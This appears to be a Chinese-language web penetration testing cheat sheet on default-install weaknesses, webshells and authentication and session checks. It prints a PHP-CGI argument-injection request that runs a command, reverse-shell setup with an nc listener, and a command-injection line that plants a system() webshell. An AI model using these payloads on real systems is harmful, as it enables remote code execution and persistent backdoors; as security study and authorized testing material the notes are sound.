# 默认配置检查

> 很多Web应用和服务器软件存在默认安装的安全隐患，攻击者可利用默认配置获取敏感信息甚至远程代码执行。

## 0x01 Windows 默认安装漏洞

- 默认安装的服务可能开放不必要的端口
- 默认账号密码未修改
- 默认开启的远程管理功能

## 0x02 phpMyAdmin

默认安装的 phpMyAdmin 常见问题:

- `phpMyAdmin/setup` 页面可被直接访问
- 默认配置可能允许无密码登录
- 利用 phpMyAdmin 执行任意 PHP 代码

```
POST http://target/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: target

<?php
passthru("id");
die();
?>
```

## 0x03 Ubuntu/Debian 默认 PHP CGI

Ubuntu / Debian 默认安装 PHP5-cgi 后，可直接访问以下路径:

- `/cgi-bin/php5`
- `/cgi-bin/php`

这些路径通常无法被爬虫发现，但可被手动探测利用。

## 0x04 PHP 反弹 Shell

Kali 内置了多种 WebShell 模板:

```bash
ls /usr/share/webshells/php/
# findsock.c  php-backdoor.php  php-findsock-shell.php
# php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php
```

使用 php-reverse-shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
# 修改 $ip 和 $port 为攻击机地址

# 攻击机监听
nc -nvvlp 1234
```

## 0x05 写入 WebShell

通过命令注入写入一句话木马:

```bash
;echo "<?php \$cmd=\$_GET['cmd'];system(\$cmd);?>" > /var/www/html/shell.php
```

## 0x06 漏洞挖掘原则

- 测试 **所有变量**
- 测试 **所有头**（包括Cookie中的变量）
- **逐个变量删除**，观察应用行为变化
- 漏洞的本质: **数据与指令的混淆** -- 对用户输入过滤不严，误将指令当数据

## 0x07 身份认证测试

- 常用弱口令 / 基于字典的密码爆破
- 测试账号锁定机制
- 信息收集: 手机号、密码错误提示信息
- 密码嗅探

## 0x08 会话 Session ID 检查

- XSS / Cookie importer 窃取
- Session ID 出现在 URL 中
- Session ID 长期/永久不变
- Session ID 生成算法分析（使用 Burpsuite Sequencer）
- 登出后返回测试（Session 是否失效）

## 0x09 密码找回漏洞

检查密码重置链接中的 token 是否可预测:

```
https://example.com/reset?email=user@example.com&key=b4c9a289323b21a01c3e940f150eb9b8c542587f1abfd8f0e1cc1ffc5e475514
```
